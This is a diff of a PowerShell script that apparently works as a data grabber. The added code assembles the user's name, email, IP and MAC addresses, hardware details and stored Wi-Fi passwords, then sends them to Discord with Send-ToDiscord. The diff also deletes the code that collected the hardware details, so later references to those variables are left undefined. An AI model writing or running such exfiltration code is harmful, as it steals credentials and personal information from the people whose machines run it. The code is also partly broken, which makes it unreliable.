@@ -136,31 +136,12 @@ try {
 ############################################################################################################################################################
 
 # Get System Information
+# Debug: Print System Details to Console
+Write-Host "Building System Details..."
+
 try {
-    # Get basic system information
-    $computerSystem = Get-CimInstance CIM_ComputerSystem
-    $computerBIOS = Get-CimInstance CIM_BIOSElement
-    $computerOS = Get-CimInstance Win32_OperatingSystem | Select-Object Caption, CSName, Version, SerialNumber, InstallDate, LastBootUpTime
-
-    # Get CPU information
-    $computerCPU = Get-CimInstance Win32_Processor | Select-Object Name, Manufacturer, MaxClockSpeed
-
-    # Get RAM capacity
-    $computerRamCapacity = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB
-    $computerRamCapacity = "{0:N1} GB" -f $computerRamCapacity
-
-    # Get Mainboard information
-    $computerMainboard = Get-CimInstance Win32_BaseBoard | Select-Object Manufacturer, Product
-
-    # Get HDD/SSD information
-    $driveInfo = Get-CimInstance Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 } | Select-Object DeviceID, VolumeName, FileSystem, @{Name="Size (GB)";Expression={"{0:N1}" -f ($_.Size / 1GB)}}, @{Name="Free Space (GB)";Expression={"{0:N1}" -f ($_.FreeSpace / 1GB)}}
-
-} catch {
-    Write-Error "Failed to gather system information"
-}
-
-# Format System Info for Output
-$SystemDetails = @"
+    # Build the System Details string
+    $SystemDetails = @"
 System Manufacturer: $($computerSystem.Manufacturer)
 System Model: $($computerSystem.Model)
 BIOS Serial Number: $($computerBIOS.SerialNumber)
@@ -180,7 +161,35 @@ Drives:
 @($driveInfo | Out-String)
 "@
 
+    # Debug: Output System Details to Console
+    Write-Host "System Details:" $SystemDetails
 
+} catch {
+    Write-Error "Failed to build System Details"
+}
+ 
+# Main Script: Construct Full System Information
+$SystemInfo = @"
+User: $FullName
+Email: $Email
+Hostname: $HostName
+Public IP: $computerPubIP
+Local IP(s): $localIP
+MAC Address: $MAC
+DHCP Enabled: $IsDHCPEnabled
+
+System Details:
+$SystemDetails
+
+Wi-Fi Passwords:
+$WiFiPasswords
+"@
+
+# Debug: Output Full System Info to Console
+Write-Host "Full System Info:" $SystemInfo
+
+# Send System Info to Discord
+Send-ToDiscord -Message $SystemInfo
 
 ###########################################################################################################################################################
 
